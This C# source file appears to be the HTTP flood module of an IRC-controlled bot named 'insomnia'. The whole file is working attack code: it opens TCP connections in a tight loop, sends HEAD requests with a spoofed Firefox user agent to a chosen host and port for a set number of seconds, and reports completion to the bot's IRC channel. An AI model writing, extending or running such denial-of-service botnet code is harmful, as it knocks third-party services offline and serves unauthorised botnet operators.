using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Diagnostics;

namespace insomnia
{
    class HTTP
    {
        public static string host;
        public static int port;
        public static int delay;
        public static bool isEnabled = false;


        public static void Begin()
        {
            int seconds = delay * 1000;
            new Thread(() => SendHTTP(Functions.ipE(host, port))).Start();

            Thread.Sleep(seconds);

            if (isEnabled)
            {
                Stop();
                IRC.WriteMessage("HTTP flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        private static void SendHTTP(IPEndPoint ip)
        {
            string request = "HEAD / HTTP/1.1\r\nHost: {0}\r\nUser-Agent: {1}\r\nConnection: Keep-Alive\r\n\r\n";
            string build_request = string.Format(request, host, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1");
            byte[] data = Encoding.UTF8.GetBytes(build_request);

            Socket s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            // As long as flood is enabled lets send data on each socket
            while (isEnabled)
            {
                try
                {
                    s.Connect(ip.Address, port);
                    s.Send(data, data.Length, 0);
                    s.Close();
                    s = null;
                    s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                }
                catch 
                {
                    if (s.Connected)
                        s.Close();

                    s = null;
                    s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                    Thread.Sleep(2000);
                }
                Thread.Sleep(10);
            }

            // Cleanup
            if (s.Connected)
                s.Close();

            s = null;
        }
    }
}
